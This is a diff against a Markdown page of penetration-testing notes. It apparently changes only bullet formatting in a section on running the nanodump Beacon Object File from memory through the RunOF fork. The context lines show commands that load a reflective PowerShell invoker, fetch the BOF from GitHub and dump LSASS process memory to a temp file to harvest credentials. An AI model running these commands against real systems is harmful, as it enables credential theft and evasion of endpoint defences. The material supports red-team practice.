@@ -87,8 +87,8 @@ beacon_command_register("msgbox", "Pops a message box", "Calls the MessageBoxA W
 
 An example of running the [nanodump.x64.o](https://github.com/helpsystems/nanodump/blob/main/dist/nanodump.x64.o) BOF via RunOF [fork](https://github.com/snovvcrash/RunOF) from memory:
 
-* Compile RunOF.exe assembly and convert it to a PowerShell invoker (see [.NET Reflective Assembly](/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly.md)).
-* Search for argument types that the target BOF uses (usually located in accompanying Aggressor scripts):
+- Compile RunOF.exe assembly and convert it to a PowerShell invoker (see [.NET Reflective Assembly](/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly.md))
+- Search for argument types that the target BOF uses (usually located in accompanying Aggressor scripts):
 
 ```
 curl -sSL 'https://github.com/helpsystems/nanodump/raw/main/'`curl -sSL 'https://api.github.com/repos/helpsystems/nanodump/git/trees/main?recursive=1' | jq -r '.tree[] | select(.path | endswith(".cna")) | .path'` | grep bof_pack
@@ -98,7 +98,7 @@ curl -sSL 'https://github.com/helpsystems/nanodump/raw/main/'`curl -sSL 'https:/
     $args = bof_pack($1, "z", $2);
 ```
 
-* Load the invoker into memory, fetch the BOF (`-u` option) and run it providing necessary arguments with their types like this:
+- Load the invoker into memory, fetch the BOF (`-u` option) and run it providing necessary arguments with their types like this:
 
 ```
 PS > Invoke-RunOF -u https://github.com/helpsystems/nanodump/raw/main/dist/nanodump.x64.o '-i:0' '-z:C:\Windows\Temp\lsass.bin' '-i:1' '-i:1' '-i:0' '-i:0' '-i:0' '-i:0' '-i:0' '-z:' '-i:0' '-z:'
